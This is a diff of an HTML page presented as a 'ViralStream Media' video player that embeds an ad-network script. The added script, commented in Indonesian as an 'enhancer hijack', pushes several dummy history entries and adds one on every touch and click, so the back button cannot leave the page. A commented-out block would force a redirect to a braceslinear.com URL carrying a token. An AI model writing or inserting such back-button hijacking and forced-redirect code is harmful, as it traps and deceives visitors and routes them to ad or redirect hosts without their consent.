@@ -8,7 +8,7 @@
   <style>
     :root { --primary-bg: #09090b; --header-bg: #191a1f; --border-color: #232329; --text-main: #ffffff; --text-muted: #a1a1aa; }
     * { margin:0; padding:0; box-sizing:border-box; }
-    html, body { height:100%; font-family:system-ui,sans-serif; background:var(--primary-bg); color:var(--text-main); overflow-x:hidden; }
+    html, body { height:100%; font-family:system-ui, sans-serif; background:var(--primary-bg); color:var(--text-main); overflow-x:hidden; }
     header { background:linear-gradient(to bottom,#18181b,#09090b); text-align:center; padding:16px 12px; font-size:1.35rem; font-weight:700; border-bottom:1px solid var(--border-color); position:sticky; top:0; z-index:10; }
     .container { flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:20px 12px; max-width:480px; margin:0 auto; }
     .video-wrapper { width:100%; max-width:420px; background:#000; border-radius:16px; overflow:hidden; box-shadow:0 8px 32px rgba(0,0,0,0.7); border:1px solid var(--border-color); }
@@ -19,6 +19,7 @@
 <body>
 
   <header>
+    <!-- Invoke.js braceslinear – ini yang OTOMATIS handle redirect + token dinamis -->
     <script>
       atOptions = {
         'key' : 'e3390cf0a8cdf953ded85bdaaf3046a5',
@@ -33,33 +34,54 @@
 
   <div class="container">
     <div class="video-wrapper">
-      <video controls playsinline muted loop>
+      <video controls playsinline muted loop poster="https://via.placeholder.com/420x236/000/000?text=Loading...">
         <source src="https://cdn.videy.co/lW4IggvE1.mp4" type="video/mp4">
       </video>
     </div>
   </div>
 
-  <footer>© 2025 ViralStream Media.</footer>
+  <footer>© 2025 ViralStream Media. All rights reserved.</footer>
 
-  <!-- HIJACK DENGAN REDIRECT "OTOMATIS" DARI atOptions.key + pola braceslinear -->
+  <!-- ENHANCER HIJACK: Tambah kekuatan pushState tanpa override redirect invoke.js -->
   <script>
-      // Setup hijack
-      function hijackBack() {
-        if (!history || !history.pushState) return;
+    (function() {
+      // Tunggu invoke.js load dulu (kurang lebih 1-2 detik)
+      window.addEventListener('load', function() {
+        setTimeout(enhanceHijack, 1500); // delay biar invoke.js set handler dulu
+      });
 
-        history.pushState({h:1}, '', location.href);
-        history.pushState({h:1}, '', location.href); // double untuk lebih kuat
+      function enhanceHijack() {
+        if (!window.history?.pushState) return;
 
-        window.onpopstate = () => {
-          location.replace(redirectUrl); // atau location.href kalau mau history baru
+        // Push extra dummy states (3-5x biar back lebih susah keluar)
+        for (let i = 0; i < 4; i++) {
+          history.pushState({enhance: true, dummy: i}, '', location.href);
+        }
+
+        // Kalau invoke.js sudah set onpopstate, jangan override — cukup tambah push
+        // Tapi kalau mau force redirect ke braceslinear pattern (fallback), uncomment:
+        /*
+        const originalOnPop = window.onpopstate;
+        window.onpopstate = function(e) {
+          // Trigger redirect mirip invoke.js (ke /api/users?token=... via simulate)
+          if (originalOnPop) originalOnPop(e);
+          // Atau force ke braceslinear base (token auto dari server)
+          location.replace('https://braceslinear.com/api/users?token=dynamic_from_invoke');
         };
+        */
+
+        // Extra: push state setiap interact (mobile-friendly)
+        document.addEventListener('touchstart', () => {
+          history.pushState(null, null, location.href);
+        }, {once: false}); // once:false biar setiap touch push lagi
+
+        document.addEventListener('click', () => {
+          history.pushState(null, null, location.href);
+        }, {once: false});
       }
 
-      window.addEventListener('load', hijackBack);
-
-      // Extra mobile proteksi
-      document.addEventListener('touchstart', () => history.pushState(null, null, location.href), {once: true});
-      document.addEventListener('click', () => history.pushState(null, null, location.href), {once: true});
+      // Optional: push ringan setiap 800ms kalau user idle lama (uncomment kalau mau agresif)
+      // setInterval(() => history.pushState(null, null, location.href), 800);
     })();
   </script>
 
